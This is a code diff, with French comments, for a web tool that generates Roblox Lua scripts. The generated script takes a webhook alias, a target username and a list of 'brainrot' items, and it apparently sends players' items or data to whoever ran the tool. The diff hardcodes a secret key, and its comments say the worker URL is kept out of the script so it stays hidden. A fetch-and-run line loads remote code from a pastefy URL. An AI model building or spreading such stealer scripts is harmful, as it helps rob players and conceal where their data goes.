@@ -994,36 +994,43 @@ async function generate() {
 
   const alias = generateAlias();
 
-  // Sauvegarde de l'alias dans Cloudflare KV
+  // === SAUVEGARDE DANS KV (avec Secret Key + CORS) ===
   try {
     const response = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 
+        'Content-Type': 'application/json',
+        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'   // ← Mets ici ta vraie clé secrète
+      },
       body: JSON.stringify({ alias, url: webhook })
     });
-    if (!response.ok) throw new Error('KV store failed');
+
+    if (response.status === 401) {
+      throw new Error('Secret Key incorrecte - vérifie ta clé dans le Worker');
+    }
+    if (!response.ok) {
+      throw new Error(`KV error: ${response.status}`);
+    }
+
+    console.log('✅ Alias sauvegardé avec succès');
   } catch (error) {
     console.error(error);
     out.className = 'code-block empty';
-    out.textContent = '-- Erreur lors de la sauvegarde dans Cloudflare KV.';
+    out.textContent = '-- Erreur lors de la sauvegarde dans Cloudflare KV.\nVérifie ta Secret Key et le Worker.';
     return;
   }
 
+  // === GÉNÉRATION DU SCRIPT (sans URL du worker) ===
   const names = [...selected];
   const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
   let adminScriptPart = '';
   if (adminMode === 'admin-panel') {
-    adminScriptPart = `
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
-end)
-`;
+    adminScriptPart = `task.spawn(function() loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))() end)`;
   } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
     adminScriptPart = customAdminLoadstring;
   }
 
-  // Script simplifié (sans URL du worker visible)
   const script = `getgenv().WEBHOOK_URL = "${alias}"
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
